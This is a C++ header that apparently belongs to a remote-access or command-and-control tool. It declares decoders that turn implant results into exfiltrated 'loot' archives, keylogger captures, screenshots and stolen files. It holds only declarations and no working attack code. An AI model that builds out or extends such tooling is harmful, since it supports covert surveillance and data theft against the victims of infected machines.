#pragma once

#include "ExfilEnvelope.hpp"
#include "LootArchive.hpp"
#include "ResultDAO.hpp"

#include <optional>
#include <string>
#include <vector>

struct DecodedArtifact {
    exfil::ExfilKind kind{exfil::ExfilKind::Text};
    std::string text;
    std::vector<unsigned char> bytes;
    std::vector<loot_archive::LootFileEntry> loot_files;
    std::string suggested_filename;
    bool success{true};
    std::string error;
};

struct IResultDecoder {
    virtual ~IResultDecoder() = default;
    [[nodiscard]] virtual DecodedArtifact decode(const ResultDAO& result, const std::string& command_text) const = 0;
};

class TextDecoder final : public IResultDecoder {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string&) const override;
};

class LootDecoder final : public IResultDecoder {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string&) const override;
};

class KeyloggerDecoder final : public IResultDecoder {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string&) const override;
};

class ScreenshotDecoder final : public IResultDecoder {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string&) const override;
};

class FileDecoder final : public IResultDecoder {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string& command_text) const override;
};

class ResultDecoderRegistry {
public:
    [[nodiscard]] DecodedArtifact decode(const ResultDAO& result, const std::string& command_text) const;

private:
    TextDecoder text_;
    LootDecoder loot_;
    KeyloggerDecoder keylogger_;
    ScreenshotDecoder screenshot_;
    FileDecoder file_;
};
